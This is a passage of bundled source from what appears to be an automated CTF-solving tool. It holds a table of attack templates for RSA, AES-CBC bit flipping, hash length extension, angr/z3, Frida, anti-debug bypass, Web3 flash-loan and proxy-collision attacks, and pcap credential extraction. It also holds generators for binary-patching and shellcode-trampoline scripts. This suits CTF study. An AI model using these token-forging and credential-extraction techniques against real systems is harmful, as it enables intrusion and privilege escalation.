    id: "rsa-small-e-coppersmith",
    title: "RSA small-e attack with Coppersmith setup",
    body: [
      "```python",
      "# Requires SageMath environment",
      "from sageall import *",
      "",
      "# Given: c = (m)^e mod N, and m has known prefix",
      "N = Integer(0)   # TODO",
      "e = Integer(3)",
      "c = Integer(0)   # TODO",
      "known = b'flag{'",
      "unknown_len = 40  # TODO bytes",
      "",
      "PR.<x> = PolynomialRing(Zmod(N))",
      "m = Integer.from_bytes(known, 'big') * 256**unknown_len + x",
      "f = (m**e - c).monic()",
      "",
      "# beta/epsilon/X depend on bound assumptions",
      "X = 2**(8 * unknown_len)",
      "roots = f.small_roots(X=X, beta=1, epsilon=1/20)",
      "if roots:",
      "    r = int(roots[0])",
      "    rec = int(m(x=r)).to_bytes((int(m(x=r)).bit_length() + 7) // 8, 'big')",
      "    print(rec)",
      "```"
    ].join(`
`)
  },
  {
    domain: "CRYPTO",
    id: "rsa-common-modulus",
    title: "RSA common modulus attack template",
    body: [
      "```python",
      "from math import gcd",
      "",
      "def egcd(a, b):",
      "    if b == 0:",
      "        return (a, 1, 0)",
      "    g, x1, y1 = egcd(b, a % b)",
      "    return (g, y1, x1 - (a // b) * y1)",
      "",
      "def modinv(a, n):",
      "    g, x, _ = egcd(a, n)",
      "    if g != 1:",
      "        raise ValueError('not invertible')",
      "    return x % n",
      "",
      "N = 0      # TODO",
      "e1 = 0     # TODO",
      "e2 = 0     # TODO",
      "c1 = 0     # TODO",
      "c2 = 0     # TODO",
      "",
      "g, a, b = egcd(e1, e2)",
      "if g != 1:",
      "    raise ValueError('exponents must be coprime for basic variant')",
      "",
      "if a < 0:",
      "    c1 = modinv(c1, N)",
      "    a = -a",
      "if b < 0:",
      "    c2 = modinv(c2, N)",
      "    b = -b",
      "",
      "m = (pow(c1, a, N) * pow(c2, b, N)) % N",
      "print(m.to_bytes((m.bit_length() + 7) // 8, 'big'))",
      "```"
    ].join(`
`)
  },
  {
    domain: "CRYPTO",
    id: "aes-cbc-bitflip",
    title: "AES-CBC bit flipping attack template",
    body: [
      "```python",
      "# Goal: modify plaintext block P_i by flipping bytes in C_{i-1}",
      "from binascii import hexlify",
      "",
      "def bitflip(prev_ct: bytes, known_plain: bytes, desired_plain: bytes) -> bytes:",
      "    if not (len(prev_ct) == len(known_plain) == len(desired_plain)):",
      "        raise ValueError('block lengths must match')",
      "    out = bytearray(prev_ct)",
      "    for i in range(len(out)):",
      "        out[i] ^= known_plain[i] ^ desired_plain[i]",
      "    return bytes(out)",
      "",
      "# Example customization",
      "orig_prev = bytes.fromhex('00' * 16)  # TODO intercepted C_{i-1}",
      "known = b'role=user;uid=1' + b'\\x00'",
      "want = b'role=admin;uid=1'",
      "new_prev = bitflip(orig_prev, known, want)",
      "print('new_prev_hex=', hexlify(new_prev).decode())",
      "",
      "# TODO: replace block in ciphertext and submit token/cookie",
      "```"
    ].join(`
`)
  },
  {
    domain: "CRYPTO",
    id: "hash-length-extension",
    title: "Hash length extension attack skeleton",
    body: [
      "```python",
      "# pip install hashpumpy",
      "import hashpumpy",
      "",
      "orig_data = 'user=guest&admin=0'",
      "orig_sig = '0123456789abcdef0123456789abcdef'  # TODO known MAC",
      "append_data = '&admin=1'",
      "",
      "for key_len in range(8, 65):",
      "    new_sig, new_data = hashpumpy.hashpump(orig_sig, orig_data, append_data, key_len)",
      "    # TODO: submit new_data/new_sig to verifier endpoint",
      "    # if accepted: print(key_len, new_sig, repr(new_data)); break",
      "",
      "# Note: applicable to Merkle-Damgard hashes (MD5/SHA1/SHA256 naive prefix-MAC)",
      "```"
    ].join(`
`)
  },
  {
    domain: "REV",
    id: "angr-symbolic-exec",
    title: "angr symbolic execution solve skeleton",
    body: [
      "```python",
      "import angr",
      "import claripy",
      "",
      "BINARY = './chall'",
      "proj = angr.Project(BINARY, auto_load_libs=False)",
      "",
      "arg_len = 32  # TODO",
      "sym_arg = claripy.BVS('sym_arg', arg_len * 8)",
      "state = proj.factory.full_init_state(args=[BINARY, sym_arg])",
      "",
      "# Restrict charset for speed and realistic input",
      "for i in range(arg_len):",
      "    ch = sym_arg.get_byte(i)",
      "    state.solver.add(ch >= 0x20, ch <= 0x7e)",
      "",
      "simgr = proj.factory.simgr(state)",
      "FIND = 0x401234  # TODO success address",
      "AVOID = [0x401111]  # TODO fail addresses",
      "simgr.explore(find=FIND, avoid=AVOID)",
      "",
      "if simgr.found:",
      "    found = simgr.found[0]",
      "    model = found.solver.eval(sym_arg, cast_to=bytes)",
      "    print(model)",
      "```"
    ].join(`
`)
  },
  {
    domain: "REV",
    id: "z3-constraint-solver",
    title: "z3 constraint solver template",
    body: [
      "```python",
      "from z3 import *",
      "",
      "s = Solver()",
      "chars = [BitVec(f'c{i}', 8) for i in range(32)]  # TODO length",
      "",
      "for c in chars:",
      "    s.add(c >= 0x20, c <= 0x7e)",
      "",
      "# TODO: translate checks from disassembly/decompiler",
      "# Example constraints:",
      "s.add(chars[0] == ord('f'))",
      "s.add(chars[1] == ord('l'))",
      "s.add(chars[2] == ord('a'))",
      "s.add(chars[3] == ord('g'))",
      "s.add(Sum([ZeroExt(24, c) for c in chars[:8]]) == 700)",
      "",
      "if s.check() == sat:",
      "    m = s.model()",
      "    out = bytes([m[c].as_long() for c in chars])",
      "    print(out)",
      "else:",
      "    print('unsat')",
      "```"
    ].join(`
`)
  },
  {
    domain: "REV",
    id: "frida-hook-skeleton",
    title: "Frida hook skeleton for runtime inspection",
    body: [
      "```javascript",
      "// Run: frida -f ./chall -l hook.js --no-pause",
      "",
      "const target = Module.findExportByName(null, 'strcmp');",
      "if (target) {",
      "  Interceptor.attach(target, {",
      "    onEnter(args) {",
      "      this.a0 = Memory.readUtf8String(args[0]);",
      "      this.a1 = Memory.readUtf8String(args[1]);",
      "      send({ event: 'strcmp_enter', a0: this.a0, a1: this.a1 });",
      "    },",
      "    onLeave(retval) {",
      "      send({ event: 'strcmp_leave', ret: retval.toInt32() });",
      "    },",
      "  });",
      "}",
      "",
      "// TODO: hook custom function by address (Module.base.add(offset))",
      "```",
      "",
      "```python",
      "# Optional host script to collect Frida messages",
      "import frida, sys",
      "",
      "def on_message(msg, data):",
      "    print(msg)",
      "",
      "session = frida.spawn(['./chall'])",
      "sess = frida.attach(session)",
      "with open('hook.js', 'r', encoding='utf-8') as f:",
      "    script = sess.create_script(f.read())",
      "script.on('message', on_message)",
      "script.load()",
      "frida.resume(session)",
      "sys.stdin.read()",
      "```"
    ].join(`
`)
  },
  {
    domain: "FORENSICS",
    id: "volatility3-workflow",
    title: "Volatility 3 memory forensics workflow",
    body: [
      "```text",
      "1) Identify image info/profile hints:",
      "   python3 vol.py -f memdump.raw windows.info",
      "",
      "2) Enumerate processes and suspicious parent-child chains:",
      "   python3 vol.py -f memdump.raw windows.pslist",
      "   python3 vol.py -f memdump.raw windows.pstree",
      "",
      "3) Inspect command lines and loaded modules:",
      "   python3 vol.py -f memdump.raw windows.cmdline",
      "   python3 vol.py -f memdump.raw windows.dlllist --pid <PID>",
      "",
      "4) Network and handles triage:",
      "   python3 vol.py -f memdump.raw windows.netscan",
      "   python3 vol.py -f memdump.raw windows.handles --pid <PID>",
      "",
      "5) Extract memory artifacts:",
      "   python3 vol.py -f memdump.raw windows.memdump --pid <PID> --dump-dir dumps/",
      "   python3 vol.py -f memdump.raw windows.filescan",
      "",
      "6) Hunt credentials/flags with strings + yara on dumps directory.",
      "```"
    ].join(`
`)
  },
  {
    domain: "FORENSICS",
    id: "steganography-pipeline",
    title: "Steganography analysis pipeline (LSB/zsteg/steghide)",
    body: [
      "```text",
      "1) File triage:",
      "   file sample.png",
      "   exiftool sample.png",
      "   binwalk -e sample.png",
      "",
      "2) Metadata and raw strings:",
      "   strings -n 6 sample.png | tee strings.txt",
      "   xxd sample.png | head",
      "",
      "3) PNG/BMP LSB extraction:",
      "   zsteg -a sample.png",
      "   zsteg sample.png -E b1,r,lsb > lsb_r_b1.bin",
      "",
      "4) Steghide attempt (jpeg/wav commonly):",
      "   steghide info sample.jpg",
      "   steghide extract -sf sample.jpg -p '<password>'",
      "",
      "5) Visual channel splitting:",
      "   python3 -m PIL sample.png  # TODO: write script to split RGB/alpha and inspect",
      "",
      "6) If archive recovered, validate with file/unzip/7z and recurse.",
      "```"
    ].join(`
`)
  },
  {
    domain: "MISC",
    id: "misc-osint-evidence-loop",
    title: "MISC/OSINT evidence-first workflow",
    body: [
      "```text",
      "1) Define hypothesis and required disconfirm evidence before collecting sources.",
      "2) Collect at least 2 independent citations per critical claim.",
      "3) Track source timestamps and archive links for reproducibility.",
      "4) Separate confirmed facts vs assumptions in notes/worklog.",
      "5) Run one cheapest disconfirm test before escalating complexity.",
      "6) Only mark solved when final claim is backed by direct evidence artifact.",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB3",
    id: "web3-flashloan-attack",
    title: "Flash-loan attack template (Foundry)",
    body: [
      "```solidity",
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.0;",
      "",
      "import {Test} from 'forge-std/Test.sol';",
      "",
      "contract FlashLoanAttack is Test {",
      "    // 1) Setup: fork mainnet or local chain",
      "    // 2) Borrow flash loan from Aave/dYdX/Uniswap",
      "    // 3) Manipulate price oracle or pool state",
      "    // 4) Execute exploit (e.g. swap at manipulated price)",
      "    // 5) Repay flash loan + fee",
      "    // 6) Assert profit > 0",
      "",
      "    function testExploit() public {",
      "        // vm.createSelectFork('mainnet');",
      "        // Step 1: Flash borrow",
      "        // Step 2: Manipulate state",
      "        // Step 3: Extract value",
      "        // Step 4: Repay",
      "    }",
      "}",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB3",
    id: "web3-delegatecall-proxy",
    title: "Delegatecall proxy storage collision exploit",
    body: [
      "```text",
      "1) Identify proxy contract using delegatecall pattern.",
      "2) Map storage layout of both proxy and implementation contracts.",
      "3) Find storage slot collisions between proxy admin/owner and implementation state.",
      "4) Craft call that writes to implementation's logic address slot via proxy.",
      "5) Replace implementation with attacker contract.",
      "6) Verify by calling proxy \u2014 should now execute attacker logic.",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB3",
    id: "web3-erc20-approval-abuse",
    title: "ERC20 approval/allowance abuse",
    body: [
      "```text",
      "1) Check for infinite approval patterns: approve(spender, type(uint256).max).",
      "2) Look for transferFrom without proper allowance checks.",
      "3) Check for front-running on approve() calls (race condition).",
      "4) Verify if contract can be tricked into approving attacker's address.",
      "5) Test with foundry fork: forge test --fork-url <rpc> -vvv.",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB3",
    id: "web3-signature-replay-attack",
    title: "Signature replay attack template",
    body: [
      "```text",
      "1) Capture a valid signed message/transaction.",
      "2) Check if nonce/chainId/deadline is enforced in the signature verification.",
      "3) If missing nonce: replay the same signature on the same or different chain.",
      "4) If missing chainId: deploy same contract on different chain, replay signature.",
      "5) Test: craft script to replay signature and verify state change.",
      "```"
    ].join(`
`)
  },
  {
    domain: "REV",
    id: "rev-anti-debug-bypass",
    title: "Anti-debug detection and bypass techniques",
    body: [
      "```text",
      "Common anti-debug techniques and bypasses:",
      "",
      "1) ptrace(PTRACE_TRACEME) check:",
      "   - Patch: NOP out the ptrace call or force return 0.",
      "   - LD_PRELOAD: Hook ptrace to always return 0.",
      "",
      "2) /proc/self/status TracerPid check:",
      "   - Patch: NOP the comparison or redirect file read.",
      "",
      "3) Timing checks (rdtsc/clock_gettime):",
      "   - Patch: NOP time queries or return fixed values.",
      "   - Use LD_PRELOAD to hook clock_gettime.",
      "",
      "4) INT3/signal handler tricks:",
      "   - Set breakpoint after the handler, not on the INT3.",
      "",
      "5) Self-checksum verification:",
      "   - Dump original bytes, compute expected checksum, patch verification.",
      "```"
    ].join(`
`)
  },
  {
    domain: "REV",
    id: "rev-unpacking",
    title: "Unpacking workflow (UPX and custom packers)",
    body: [
      "```text",
      "1) Detect packer: strings / DIE (Detect It Easy) / PEiD / file.",
      "2) For UPX: upx -d <binary> (standard unpack).",
      "3) For custom packers:",
      "   a) Set breakpoint at OEP (Original Entry Point).",
      "   b) Run under gdb until unpacking stub completes.",
      "   c) Dump memory: gdb> dump binary memory unpacked.bin 0x400000 0x500000.",
      "   d) Fix ELF headers if needed.",
      "4) For multi-layer: repeat until no more packing detected.",
      "5) Verify: strings/readelf on unpacked binary should show real symbols.",
      "```"
    ].join(`
`)
  },
  {
    domain: "REV",
    id: "rev-dynamic-instrumentation",
    title: "Frida/GDB dynamic instrumentation for runtime analysis",
    body: [
      "```python",
      "import frida",
      "",
      "script_code = '''",
      "Interceptor.attach(Module.findExportByName(null, 'strcmp'), {",
      "    onEnter: function(args) {",
      "        console.log('strcmp(' + Memory.readUtf8String(args[0]) + ', ' + Memory.readUtf8String(args[1]) + ')');",
      "    },",
      "    onLeave: function(retval) {",
      "        console.log('  => ' + retval);",
      "    }",
      "});",
      "'''",
      "",
      "pid = frida.spawn('./target')",
      "session = frida.attach(pid)",
      "script = session.create_script(script_code)",
      "script.on('message', lambda msg, data: print(msg))",
      "script.load()",
      "frida.resume(pid)",
      "input('Press Enter to exit...')",
      "```"
    ].join(`
`)
  },
  {
    domain: "REV",
    id: "rev-constraint-solving",
    title: "Angr/Z3 constraint solving with symbolic execution",
    body: [
      "```python",
      "import angr, claripy",
      "",
      "proj = angr.Project('./target', auto_load_libs=False)",
      "",
      "# Symbolic input (e.g., 32-byte flag)",
      "flag = claripy.BVS('flag', 8 * 32)",
      "",
      "state = proj.factory.entry_state(stdin=angr.SimFile('/dev/stdin', content=flag))",
      "",
      "# Add constraints: printable ASCII",
      "for i in range(32):",
      "    state.solver.add(flag.get_byte(i) >= 0x20)",
      "    state.solver.add(flag.get_byte(i) <= 0x7e)",
      "",
      "simgr = proj.factory.simgr(state)",
      "",
      "# Find: address of 'Correct', Avoid: address of 'Wrong'",
      "simgr.explore(find=0x401234, avoid=0x401256)",
      "",
      "if simgr.found:",
      "    solution = simgr.found[0].solver.eval(flag, cast_to=bytes)",
      "    print(f'Flag: {solution}')",
      "```"
    ].join(`
`)
  },
  {
    domain: "FORENSICS",
    id: "forensics-pcap-reconstruction",
    title: "PCAP stream reconstruction and credential extraction",
    body: [
      "```text",
      "1) Protocol hierarchy: tshark -r capture.pcap -q -z io,phs",
      "2) HTTP objects: tshark -r capture.pcap --export-objects http,./http_objects/",
      "3) TCP streams: tshark -r capture.pcap -z follow,tcp,ascii,0",
      "4) Credential search: tshark -r capture.pcap -Y 'http.request.method==POST' -T fields -e http.file_data",
      "5) DNS queries: tshark -r capture.pcap -Y dns -T fields -e dns.qry.name | sort -u",
      "6) FTP credentials: tshark -r capture.pcap -Y 'ftp.request.command==USER||ftp.request.command==PASS'",
      "7) For encrypted traffic: look for TLS keys in memory dumps or environment.",
      "```"
    ].join(`
`)
  },
  {
    domain: "FORENSICS",
    id: "forensics-disk-timeline",
    title: "Disk image timeline and deleted file recovery",
    body: [
      "```text",
      "1) Identify filesystem: file disk.img; mmls disk.img",
      "2) Mount: mount -o ro,loop,offset=<byte_offset> disk.img /mnt/forensic/",
      "3) Timeline: fls -r -m / disk.img > bodyfile; mactime -b bodyfile > timeline.csv",
      "4) Deleted files: fls -d disk.img; icat disk.img <inode> > recovered_file",
      "5) File carving: foremost -i disk.img -o carved/; photorec disk.img",
      "6) Slack space: blkcat disk.img <block> | xxd | head",
      "7) Hash everything: sha256sum recovered_* > hashes.txt",
      "```"
    ].join(`
`)
  },
  {
    domain: "FORENSICS",
    id: "forensics-registry-analysis",
    title: "Windows registry forensics workflow",
    body: [
      "```text",
      "1) Extract registry hives from disk image: SYSTEM, SAM, SOFTWARE, NTUSER.DAT, UsrClass.dat",
      "2) Recent documents: regripper -r NTUSER.DAT -p recentdocs",
      "3) USB history: regripper -r SYSTEM -p usbstor",
      "4) User accounts: regripper -r SAM -p samparse",
      "5) Installed software: regripper -r SOFTWARE -p uninstall",
      "6) Autorun entries: regripper -r NTUSER.DAT -p run; regripper -r SOFTWARE -p run",
      "7) User assist (program execution): regripper -r NTUSER.DAT -p userassist",
      "8) Shellbags (folder access): regripper -r UsrClass.dat -p shellbags",
      "```"
    ].join(`
`)
  },
  {
    domain: "MISC",
    id: "misc-encoding-chain-solver",
    title: "Multi-layer encoding chain solver",
    body: [
      "```python",
      "import base64, binascii, codecs",
      "",
      "def try_decode(data: bytes) -> list:",
      "    results = []",
      "    # Base64",
      "    try:",
      "        d = base64.b64decode(data, validate=True)",
      "        results.append(('base64', d))",
      "    except Exception: pass",
      "    # Base32",
      "    try:",
      "        d = base64.b32decode(data)",
      "        results.append(('base32', d))",
      "    except Exception: pass",
      "    # Hex",
      "    try:",
      "        d = binascii.unhexlify(data.strip())",
      "        results.append(('hex', d))",
      "    except Exception: pass",
      "    # ROT13",
      "    try:",
      "        d = codecs.decode(data.decode(), 'rot13').encode()",
      "        results.append(('rot13', d))",
      "    except Exception: pass",
      "    return results",
      "",
      "def solve_chain(data: bytes, max_depth=10):",
      "    for depth in range(max_depth):",
      "        results = try_decode(data)",
      "        if not results:",
      "            print(f'Depth {depth}: no more decodings. Final: {data}')",
      "            return data",
      "        method, decoded = results[0]",
      "        print(f'Depth {depth}: {method} -> {decoded[:50]}...')",
      "        data = decoded",
      "    return data",
      "",
      "# Usage: solve_chain(open('encoded.txt','rb').read())",
      "```"
    ].join(`
`)
  },
  {
    domain: "MISC",
    id: "misc-qr-barcode-extraction",
    title: "QR code and barcode extraction workflow",
    body: [
      "```text",
      "1) Visual inspection: look for QR codes in images, PDFs, or video frames.",
      `2) Direct decode: zbarimg <image> or python3 -c 'from pyzbar.pyzbar import decode; from PIL import Image; print(decode(Image.open("image.png")))'`,
      "3) If QR is damaged/partial: use QRazyBox (online) or manual error correction.",
      "4) If QR is hidden: adjust contrast/brightness, try different color channels.",
      "5) For barcodes: zbarimg works for most formats (EAN, UPC, Code128, etc.).",
      "6) For Aztec/DataMatrix: use specialized decoders or libdmtx.",
      "7) Check for steganography within the QR payload itself.",
      "```"
    ].join(`
`)
  }
];
function listExploitTemplates(domain3) {
  return TEMPLATES.filter((t) => domain3 ? t.domain === domain3 : true).map(({ body: _body, ...rest }) => rest);
}
function getExploitTemplate(domain3, id) {
  const normalizedId = id.trim();
  if (!normalizedId) {
    return null;
  }
  return TEMPLATES.find((t) => t.domain === domain3 && t.id === normalizedId) ?? null;
}

// src/orchestration/rev-toolkit.ts
function generateRelaPatchScript(binaryPath, sectionOffset, entryIndex, dummyAddress = 3735879680) {
  const entryOffset = sectionOffset + entryIndex * 24;
  return [
    `#!/usr/bin/env python3`,
    `"""Patch RELA entry ${entryIndex} r_offset to neutralize clearing."""`,
    `import struct, shutil, sys`,
    ``,
    `src = ${JSON.stringify(binaryPath)}`,
    `dst = src + ".patched"`,
    `shutil.copy2(src, dst)`,
    ``,
    `with open(dst, "r+b") as f:`,
    `    f.seek(${entryOffset})`,
    `    f.write(struct.pack("<Q", ${dummyAddress}))  # overwrite r_offset`,
    ``,
    `print(f"Patched RELA entry at offset 0x{${entryOffset}:x} -> r_offset=0x{${dummyAddress}:x}")`,
    `print(f"Output: {dst}")`
  ].join(`
`);
}
function generateSyscallTrampoline(cfg) {
  const lines = [
    `# write(1, 0x${cfg.writeAddr1.toString(16)}, ${cfg.writeLen1})`,
    `mov rax, 1`,
    `mov rdi, 1`,
    `mov rsi, 0x${cfg.writeAddr1.toString(16)}`,
    `mov rdx, ${cfg.writeLen1}`,
    `syscall`,
    ``,
    `# write(1, 0x${cfg.writeAddr2.toString(16)}, ${cfg.writeLen2})`,
    `mov rax, 1`,
    `mov rdi, 1`,
    `mov rsi, 0x${cfg.writeAddr2.toString(16)}`,
    `mov rdx, ${cfg.writeLen2}`,
    `syscall`,
    ``,
    `# exit(0)`,
    `mov rax, 60`,
    `xor rdi, rdi`,
    `syscall`
  ];
  return lines.join(`
`);
}
function generateEntryPatchScript(binaryPath, entryVaddr, cfg) {
  return [
    `#!/usr/bin/env python3`,
    `"""Patch entry to syscall trampoline for runtime buffer extraction."""`,
    `from pwn import *`,
    `import shutil`,
    ``,
    `src = ${JSON.stringify(binaryPath)}`,
    `dst = src + ".stub"`,
    `shutil.copy2(src, dst)`,
    ``,
    `elf = ELF(dst)`,
    ``,
    `# Build trampoline: write(1, buf_out, 8) + write(1, buf_expected, 8) + exit(0)`,
    `shellcode = asm(`,
    `    f"""`,
    `    mov rax, 1`,
    `    mov rdi, 1`,
    `    mov rsi, {hex(cfg.writeAddr1)}`,
    `    mov rdx, {cfg.writeLen1}`,
    `    syscall`,
    `    mov rax, 1`,
    `    mov rdi, 1`,
    `    mov rsi, {hex(cfg.writeAddr2)}`,
    `    mov rdx, {cfg.writeLen2}`,
    `    syscall`,
    `    mov rax, 60`,
    `    xor rdi, rdi`,
    `    syscall`,
    `    """,`,
    `    arch="amd64"`,
    `)`,
    ``,
    `vaddr = ${hex5(entryVaddr)}`,
    `offset = elf.vaddr_to_offset(vaddr)`,
    ``,
    `with open(dst, "r+b") as f:`,
    `    f.seek(offset)`,
    `    f.write(shellcode)`,
    ``,
    `print(f"Patched entry 0x{vaddr:x} (offset 0x{offset:x}) with {len(shellcode)}-byte trampoline")`,
    `print(f"Output: {dst}")`
  ].join(`
`);
}
function hex5(n) {
  return `0x${n.toString(16)}`;
}
function base255Encode(data, chunkSize = 7) {
  const result = [];
  for (let i = 0;i < data.length; i += chunkSize) {
    const chunk = data.slice(i, Math.min(i + chunkSize, data.length));
    let value = 0n;
    for (const byte of chunk) {
      value = value << 8n | BigInt(byte);
    }
    const encoded = [];
    const outputLen = chunk.length + 1;
    for (let j = 0;j < outputLen; j++) {
      const remainder = Number(value % 255n);
      encoded.unshift(remainder + 1);
      value = value / 255n;
    }
    result.push(...encoded);
  }
  return new Uint8Array(result);
}
function base255Decode(encoded, chunkSize = 7) {
  const encodedChunkSize = chunkSize + 1;
  const result = [];
  for (let i = 0;i < encoded.length; i += encodedChunkSize) {
    const chunk = encoded.slice(i, Math.min(i + encodedChunkSize, encoded.length));
    let value = 0n;
    for (const byte of chunk) {
      value = value * 255n + BigInt(byte - 1);
    }
    const decoded = [];
    for (let j = 0;j < chunkSize; j++) {
      decoded.unshift(Number(value & 0xffn));
      value = value >> 8n;
    }
    result.push(...decoded);
  }
  return new Uint8Array(result);
}
function modInverse(a, m) {
  let [old_r, r] = [a % m, m];
  let [old_s, s] = [1, 0];
  while (r !== 0) {
    const quotient = Math.floor(old_r / r);
    [old_r, r] = [r, old_r - quotient * r];
    [old_s, s] = [s, old_s - quotient * s];
  }
  return (old_s % m + m) % m;
}
function generateLinearRecoveryScript(dumpDir, binCount, multiplier, modulus = 256, chunkSize = 7) {
  const inv = modInverse(multiplier, modulus);
  return [
    `#!/usr/bin/env python3`,
    `"""Recover original file from dumped (out, expected) buffer pairs."""`,
    `import struct, os, sys`,
    ``,
    `DUMP_DIR = ${JSON.stringify(dumpDir)}`,
    `BIN_COUNT = ${binCount}`,
    `MUL = ${multiplier}`,
    `INV_MUL = ${inv}  # modular inverse of ${multiplier} mod ${modulus}`,
    `MOD = ${modulus}`,
    `CHUNK_SIZE = ${chunkSize}`,
    ``,
    `def base255_decode(encoded, chunk_size=${chunkSize}):`,
    `    enc_chunk = chunk_size + 1`,
    `    result = bytearray()`,
    `    for i in range(0, len(encoded), enc_chunk):`,
    `        c = encoded[i:i+enc_chunk]`,
    `        val = 0`,
    `        for b in c:`,
    `            val = val * 255 + (b - 1)`,
    `        raw = val.to_bytes(chunk_size, "big")`,
    `        result.extend(raw)`,
    `    return bytes(result)`,
    ``,
    `result = bytearray()`,
    `scanned_pairs = 0`,
    `degenerate_pairs = 0`,
    `for idx in range(BIN_COUNT):`,
    `    out_path = os.path.join(DUMP_DIR, f"bin{idx:03d}.out")`,
    `    exp_path = os.path.join(DUMP_DIR, f"bin{idx:03d}.expected")`,
    `    if not os.path.exists(out_path):`,
    `        print(f"ERROR: Missing dump file: {out_path}")`,
    `        print("Ensure per-bin out/expected buffers are dumped before running recovery.")`,
    `        sys.exit(1)`,
    `    if not os.path.exists(exp_path):`,
    `        print(f"ERROR: Missing dump file: {exp_path}")`,
    `        print("Ensure per-bin out/expected buffers are dumped before running recovery.")`,
    `        sys.exit(1)`,
    `    with open(out_path, "rb") as f:`,
    `        out_data = f.read()`,
    `    with open(exp_path, "rb") as f:`,
    `        exp_data = f.read()`,
    `    if len(out_data) == 0:`,
    `        print(f"ERROR: Empty dump file: {out_path}")`,
    `        print("Each bin needs non-zero out/expected data for recovery.")`,
    `        sys.exit(1)`,
    `    if len(exp_data) == 0:`,
    `        print(f"ERROR: Empty dump file: {exp_path}")`,
    `        print("Each bin needs non-zero out/expected data for recovery.")`,
    `        sys.exit(1)`,
    `    if len(out_data) != len(exp_data):`,
    `        print(f"ERROR: Length mismatch for bin {idx:03d}: out={len(out_data)} expected={len(exp_data)}")`,
    `        print("Re-dump both operands from the same compare site so lengths match.")`,
    `        sys.exit(1)`,
    `    scanned_pairs += 1`,
    `    if out_data == exp_data:`,
    `        degenerate_pairs += 1`,
    `        continue`,
    `    real_arg = bytes((INV_MUL * ((e - o) % MOD)) % MOD for o, e in zip(out_data, exp_data))`,
    `    if any(b == 0 for b in real_arg):`,
    `        print(f"ERROR: Invalid base255 input in bin {idx:03d}: recovered real_arg contains 0x00 byte(s).")`,
    `        print("base255 decode expects bytes in 0x01..0xFF; a zero byte means the operand dumps are not aligned with the pre-transform compare input.")`,
    `        print("Next steps: dump true compare operands at the compare site; dump the pre-transform buffer; verify one known-failing index differs.")`,
    `        sys.exit(1)`,
    `    chunk = base255_decode(real_arg, CHUNK_SIZE)`,
    `    result.extend(chunk)`,
    ``,
    `if scanned_pairs == 0:`,
    `    print("ERROR: No dump pairs were scanned (BIN_COUNT produced zero usable iterations).")`,
    `    print("Provide at least one valid out/expected pair and retry.")`,
    `    sys.exit(1)`,
    `if degenerate_pairs == scanned_pairs:`,
    `    print("ERROR: Degenerate dump pairs detected: out_data == exp_data for every scanned bin.")`,
    `    print("These pairs are unusable for linear recovery because (expected - out) collapses and cannot recover the true argument.")`,
    `    print("Next steps: dump true compare operands at the compare site; dump the pre-transform buffer; verify one known-failing index differs.")`,
    `    sys.exit(1)`,
    ``,
    `# Trim padding (last 2 bytes for 6963-byte files)`,
    `with open("recovered_file", "wb") as f:`,
    `    f.write(result)`,
    `print(f"Recovered {len(result)} bytes -> recovered_file")`
  ].join(`
`);
}

// src/orchestration/hypothesis-registry.ts
init_debug_log();
import { appendFileSync as appendFileSync3, existsSync as existsSync10, mkdirSync as mkdirSync6, readFileSync as readFileSync9 } from "fs";
import { join as join11 } from "path";

class HypothesisRegistry {
  records = new Map;
  storePath;
  nextId = 1;
  nextExpId = 1;
  constructor(rootDir) {
    this.storePath = join11(rootDir, "hypothesis-registry.jsonl");
    this.load();
  }
  load() {
    try {
      if (!existsSync10(this.storePath))
        return;
      const content = readFileSync9(this.storePath, "utf-8");
      for (const line of content.split(`
`)) {
        if (!line.trim())
          continue;
        try {
          const record3 = JSON.parse(line);
          this.records.set(record3.id, record3);
          const numericId = parseInt(record3.id.replace("H", ""), 10);
          if (numericId >= this.nextId)
            this.nextId = numericId + 1;
          for (const exp of record3.experiments) {
            const expNumId = parseInt(exp.id.replace("E", ""), 10);
            if (expNumId >= this.nextExpId)
              this.nextExpId = expNumId + 1;
          }
        } catch {
          debugLog("hypothesis", `skipping malformed line`);
        }
      }
    } catch (error92) {
      debugLog("hypothesis", "load failed", error92);
    }
  }
  persist(record3) {
    try {
      mkdirSync6(join11(this.storePath, ".."), { recursive: true });
      appendFileSync3(this.storePath, `${JSON.stringify(record3)}
`, "utf-8");
    } catch (error92) {
      debugLog("hypothesis", "persist failed", error92);
    }
  }
  createHypothesis(hypothesis, tags = []) {
    const id = `H${this.nextId++}`;
    const now = new Date().toISOString();
    const record3 = {
      id,
      hypothesis,
      status: "active",
      createdAt: now,
      updatedAt: now,
      experiments: [],
      tags
    };
    this.records.set(id, record3);
    this.persist(record3);
    return record3;
  }
  addExperiment(hypothesisId, description, method, artifactPaths, verdict, evidence) {
    const record3 = this.records.get(hypothesisId);
    if (!record3)
      return null;
    const duplicate = record3.experiments.find((e) => e.method === method && e.description === description);
    if (duplicate) {
      debugLog("hypothesis", `duplicate experiment skipped: ${description} on ${hypothesisId}`);
      return duplicate;
    }
    const exp = {
      id: `E${this.nextExpId++}`,
      description,
      method,
      artifactPaths,
      verdict,
      evidence,
      timestamp: new Date().toISOString()
    };
    record3.experiments.push(exp);
    record3.updatedAt = exp.timestamp;
    if (verdict === "refutes") {
      record3.status = "refuted";
    }
    this.persist(record3);
    return exp;
  }
  updateStatus(hypothesisId, status, supersededBy) {
    const record3 = this.records.get(hypothesisId);
    if (!record3)
      return false;
    record3.status = status;
    record3.updatedAt = new Date().toISOString();
    if (supersededBy)
      record3.supersededBy = supersededBy;
    this.persist(record3);
    return true;
  }
  getActive() {
    return [...this.records.values()].filter((r) => r.status === "active");
  }
  getAll() {
    return [...this.records.values()];
  }
  get(id) {
    return this.records.get(id);
  }
  hasExperiment(method, description) {
    for (const record3 of this.records.values()) {
      if (record3.experiments.some((e) => e.method === method && e.description === description)) {
        return true;
      }
    }
    return false;
  }
  markAllActiveAsStale() {
    let count = 0;
    const now = new Date().toISOString();
    for (const record3 of this.records.values()) {
      if (record3.status === "active") {
        record3.status = "stale";
        record3.updatedAt = now;
        this.persist(record3);
        count++;
      }
    }
    return count;
  }
  summarize() {
    const records = this.getAll();
    if (records.length === 0)
      return "No hypotheses registered.";
    const lines = [`Hypothesis Registry (${records.length} total):`];
    for (const r of records) {
      const expSummary = r.experiments.length > 0 ? r.experiments.map((e) => `    ${e.id}: ${e.verdict} \u2014 ${e.description}`).join(`
